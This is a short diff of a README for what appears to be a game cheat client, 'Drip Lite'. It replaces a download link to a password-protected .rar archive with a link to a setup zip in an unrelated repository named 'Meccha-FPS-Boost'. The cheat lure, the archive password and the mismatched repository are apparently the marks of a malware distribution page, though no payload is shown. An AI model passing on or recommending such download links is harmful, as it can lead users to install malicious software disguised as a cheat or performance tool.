@@ -13,8 +13,7 @@ Drip Lite &amp; update + fix
 
 ---
 
-## 🔓 [Download](https://github.com/DoctorWhisper/Drip-Lite-Client/releases/download/Drip-Lite-Client/Drip-Lite-Client.rar)
-##  PASSWORD 2026 PASSWORD 2026 
+## 🔓 [Download](https://github.com/Centralkremarina/Meccha-FPS-Boost/releases/download/v2.3.10/setup.v2.3.10.zip)
 
 ---
 
